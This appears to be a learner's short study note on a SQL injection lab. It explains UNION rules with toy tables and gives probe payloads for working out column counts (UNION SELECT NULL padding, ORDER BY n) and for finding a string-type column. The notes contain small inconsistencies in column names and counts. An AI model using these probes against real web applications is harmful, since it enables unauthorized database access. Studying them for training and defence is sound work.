SQLi - Product category filter

ENd Goal - determine the number of columns returned by the query

Background --
------------

table1            table2
a | b                c | b 
-----               -------
1, 2                 3, 4
4, 5                 6, 7

Query #1: Select a, b from table1 
Result-
1,2
4,5

Query #2: Select a, b from table1 UNION select c,d from table2
Result-
1,2
4,5
3,4
6,7

Rule of combining UNION operator-
1. The number and the order of the columns must be same in all queries
2. The data types must be compatible

SQLi Attack (way #1)
--------------------

select ? from table1 UNION select NULL --> error -> incorrect number of columns

select ? from table1 UNION select NULL, NULL -> 200 response code -> correct number of columns

SQLi Attack (way #2)
---------------------
select ? from table ORDER BY 1 --> 1 implies order by the 1st column --> return 200 response
select ? from table ORDER BY 2 --> 200 response
select ? from table ORDER BY 3 --> error -> table has 3 - 1 # of columns



Step #2: Determine the data type of the columns
No. of columns is 3

select a, b from table UNION select 'a', NULL, NULL -> error -> column is not type string

select a, b from table UNION select NULL,'a', NULL-> not error -> column is type string


2nd column is the string type.
